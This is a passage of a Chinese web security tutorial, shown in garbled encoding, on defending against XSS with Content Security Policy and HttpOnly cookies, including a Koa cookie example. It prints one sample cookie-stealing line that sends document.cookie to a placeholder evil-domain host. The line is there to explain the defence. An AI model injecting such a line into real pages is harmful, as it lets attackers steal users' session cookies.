<li>ç¦æ­¢åŠ è½½å¤–åŸŸä»£ç ï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘</li>
<li>ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åï¼Œç”¨æˆ·çš„æ•°æ®ä¸ä¼šæ³„æ¼åˆ°å¤–åŸŸ</li>
<li>ç¦æ­¢å†…è”è„šæœ¬æ‰§è¡Œï¼ˆè§„åˆ™è¾ƒä¸¥æ ¼ï¼Œç›®å‰å‘ç° Github ä½¿ç”¨ï¼‰</li>
<li>ç¦æ­¢æœªæˆæƒçš„è„šæœ¬æ‰§è¡Œï¼ˆæ–°ç‰¹æ€§ï¼ŒGoogle Map ç§»åŠ¨ç‰ˆåœ¨ä½¿ç”¨ï¼‰</li>
<li>åˆç†ä½¿ç”¨ä¸ŠæŠ¥å¯ä»¥åŠæ—¶å‘ç° XSSï¼Œåˆ©äºå°½å¿«ä¿®å¤é—®é¢˜</li>
</ul>
<blockquote>
<p>æ›´å¤šå…³äº CSP çš„ç†è§£å¯ä»¥å‚è€ƒ <a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener noreferrer nofollow">Content Security Policyï¼ˆCSPï¼‰æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆå®ƒèƒ½ä½äº XSS æ”»å‡»ï¼Ÿ</a></p>
<p>æˆ–è€…æŸ¥çœ‹å…³äº <a href="/front-end/computer-networks/http/content-security-policy">HTTP CSP å†…å®¹å®‰å…¨ç­–ç•¥</a> çš„æ•´ç†ã€‚</p>
</blockquote>
<h3>HTTPOnly Cookie</h3>
<p>çªƒå–ç½‘é¡µ Cookie çš„ç¤ºä¾‹ï¼š</p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://www.evil-domain.com/steal-cookie.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
</code></pre>
<p>ä½¿ç”¨ HttpOnly Cookie å°†é‡è¦çš„ Cookie æ ‡è®°ä¸º <code>http-only</code>ï¼Œè¿™æ ·çš„è¯å½“æµè§ˆå™¨å‘ Web æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„æ—¶å°±ä¼šå¸¦ä¸Š Cookie å­—æ®µï¼Œä½†æ˜¯åœ¨ JavaScript è„šæœ¬ä¸­å´ä¸èƒ½è®¿é—®è¿™ä¸ª Cookieï¼Œè¿™æ ·å°±é¿å…äº† XSS æ”»å‡»åˆ©ç”¨ JavaScript çš„ <code>document.cookie</code> è·å– Cookieã€‚</p>
<p>åœ¨ Koa ä¸­è®¾ç½® Cookie <code>httpOnly</code> å±æ€§ï¼š</p>
<pre class="hljs language-js"  style=--lang:"js" ><code><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();

app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; {
  <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">url</span> === <span class="hljs-string">&#x27;/index&#x27;</span>) {
    ctx.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;cid&#x27;</span>, <span class="hljs-string">&#x27;hello world&#x27;</span>, {
      <span class="hljs-comment">// å†™ Cookie æ‰€åœ¨åŸŸå</span>
      <span class="hljs-attr">domain</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,
      <span class="hljs-comment">// å†™ Cookie æ‰€åœ¨çš„è·¯å¾„</span>
      <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/index&#x27;</span>,
      <span class="hljs-comment">// Cookie æœ‰æ•ˆæ—¶é•¿</span>
      <span class="hljs-attr">maxAge</span>: <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
      <span class="hljs-comment">// Cookie å¤±æ•ˆæ—¶é—´</span>
      <span class="hljs-attr">expires</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&#x27;2017-02-15&#x27;</span>),
      <span class="hljs-comment">// æ˜¯å¦åªç”¨äº HTTP è¯·æ±‚ä¸­è·å–</span>
      <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-comment">// æ˜¯å¦å…è®¸é‡å†™</span>
      <span class="hljs-attr">overwrite</span>: <span class="hljs-literal">false</span>,
    });

    ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Cookie is ok.&#x27;</span>;
  } <span class="hljs-keyword">else</span> {
    ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello world!&#x27;</span>;
  }
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">300</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[demo] Cookie is starting at port 3000&#x27;</span>);
});
</code></pre>
<p>åœ¨ Chrome æµè§ˆå™¨ Application é¢æ¿æŸ¥çœ‹ Cookie ç¼“å­˜å¯ä»¥ç›´åˆ°å“ªäº› Cookie å­—æ®µè®¾ç½®äº† HttpOnlyï¼š</p>
<img alt="Cookies HttpOnly" src="../../assets/web-security/xss-cookies-httponly.jpg" width="720" /><h2>å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener noreferrer nofollow">ğŸ“– MDN: å†…å®¹å®‰å…¨ç­–ç•¥(CSP)</a></li>
<li><a href="https://www.bilibili.com/video/av56520828" target="_blank" rel="noopener noreferrer nofollow">ğŸ“½ Web å®‰å…¨ä¹‹ XSS æ”»å‡»ä¸é˜²å¾¡</a></li>
<li><a href="https://juejin.im/post/6844903685122703367" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ å‰ç«¯å®‰å…¨ç³»åˆ—ï¼šå¦‚ä½•é˜²æ­¢ XSS æ”»å‡»?</a></li>
<li><a href="https://yq.aliyun.com/articles/638829" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ Web å®‰å…¨ç³»åˆ—ï¼šXSS æ”»å‡»åŸºç¡€åŠåŸç†</a></li>
<li><a href="https://yq.aliyun.com/articles/638935?spm=a2c4e.11153940.blogcont638829.21.74d874d3lHE0qK" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ Web å®‰å…¨ç³»åˆ—ï¼šXSS æ”»å‡»è¿›é˜¶</a></li>
<li><a href="https://yq.aliyun.com/articles/641535?spm=a2c4e.11153940.blogcont638935.16.6e757039SLyW6B" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ Web å®‰å…¨ç³»åˆ—ï¼šXSS æ”»å‡»è¿›é˜¶</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ é˜®ä¸€å³° Content Security Policy å…¥é—¨æ•™ç¨‹</a></li>
<li><a href="https://www.cnblogs.com/Wayou/p/intro_to_content_security_policy.html" target="_blank" rel="noopener noreferrer nofollow">ğŸ“ Content Security Policyï¼ˆCSPï¼‰ä»‹ç»</a></li>
</ul>
4:["$","div",null,{"className":"markdown-body","children":["$","article",null,{"dangerouslySetInnerHTML":{"__html":"$c"}}]}]
a:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
8:[["$","meta","0",{"charSet":"utf-8"}],["$","title","1",{"children":"front-end"}],["$","meta","2",{"name":"description","content":"front-end knowledge"}],["$","link","3",{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"16x16"}]]
6:null
